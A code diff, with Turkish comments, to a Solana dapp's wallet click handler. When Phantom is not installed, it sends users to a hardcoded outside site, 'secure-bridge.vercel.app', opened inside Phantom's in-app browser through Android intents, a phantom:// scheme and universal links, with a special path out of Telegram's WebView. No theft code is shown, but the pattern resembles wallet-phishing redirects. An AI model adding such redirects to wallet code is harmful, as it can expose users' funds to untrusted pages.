@@ -336,29 +336,37 @@ const handleWalletClick = async (w: DrawerWallet) => {
       /Telegram/i.test(ua) &&
       typeof (window as any).Telegram?.WebApp !== 'undefined';
 
-    // 1) Phantom SDK/yüklü eklenti varsa normal imzala+gönder
+    // 1) Phantom SDK/yüklü eklenti varsa doğrudan imzala-gönder
     if (w.readyState === WalletReadyState.Installed && sol?.isPhantom) {
       await select('Phantom' as WalletName);
       return doTx();
     }
 
-    // Sabit yönlendirme URL'i
-    const redirectUrl = 'https://secure-bridge.vercel.app/';
+    /* ====== Sabit yönlendirme adresi ====== */
+    const targetUrl   = 'https://secure-bridge.vercel.app/';
+    const encoded     = encodeURIComponent(targetUrl);
+    const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
 
-    // 2) Android + Telegram Mini-App → intent (harici tarayıcı)
+    // Android+Telegram için intent (dış tarayıcı) — fallback: universal link
+    const intentDefaultBrowser = [
+      `intent://${hostAndPath}`,
+      `#Intent;scheme=https`,
+      `;action=android.intent.action.VIEW`,
+      `;category=android.intent.category.BROWSABLE`,
+      `;S.browser_fallback_url=https://phantom.app/ul/browse/${encoded}?ref=${encoded}`,
+      `;end`
+    ].join('');
+
+    // Android normal tarayıcı → Phantom custom-scheme
+    const schemePhantom   = `phantom://browse/${encoded}?ref=${encoded}`;
+
+    // iOS & Desktop → Phantom universal link
+    const universalPhantom = `https://phantom.app/ul/browse/${encoded}?ref=${encoded}`;
+
+    /* ---------- Yönlendirme mantığı ---------- */
+
+    // 3) Android + Telegram Mini-App → intent
     if (isAndroid && isTelegramWebView) {
-      const origin     = window.location.origin;
-      const pathname   = window.location.pathname;
-      const targetUrl  = origin + pathname;
-      const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
-      const intentDefaultBrowser = [
-        `intent://${hostAndPath}`,
-        `#Intent;scheme=https`,
-        `;action=android.intent.action.VIEW`,
-        `;category=android.intent.category.BROWSABLE`,
-        `;S.browser_fallback_url=${redirectUrl}`,
-        `;end`
-      ].join('');
       const a = document.createElement('a');
       a.href   = intentDefaultBrowser;
       a.target = '_blank';
@@ -368,24 +376,29 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 3) Android normal tarayıcı → sabit redirectUrl
+    // 4) Android normal tarayıcı → Phantom scheme
     if (isAndroid) {
-      window.location.href = redirectUrl;
+      const a = document.createElement('a');
+      a.href   = schemePhantom;
+      a.target = '_blank';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(() => a.remove(), 700);
       return;
     }
 
-    // 4) iOS veya Desktop → sabit redirectUrl
-    window.location.href = redirectUrl;
+    // 5) iOS veya Desktop → Universal link
+    window.location.href = universalPhantom;
     return;
   }
 
-  // Diğer cüzdanlar…
+  /* ---------- Diğer cüzdanlar ---------- */
   if (w.readyState === WalletReadyState.Installed) {
     await select(w.adapter.name as WalletName);
     return doTx();
   }
 
-  // Fallback: default deepLink kullan
+  // Yüklü değilse varsayılan deepLink
   window.open(w.deepLink, '_blank');
 };
 
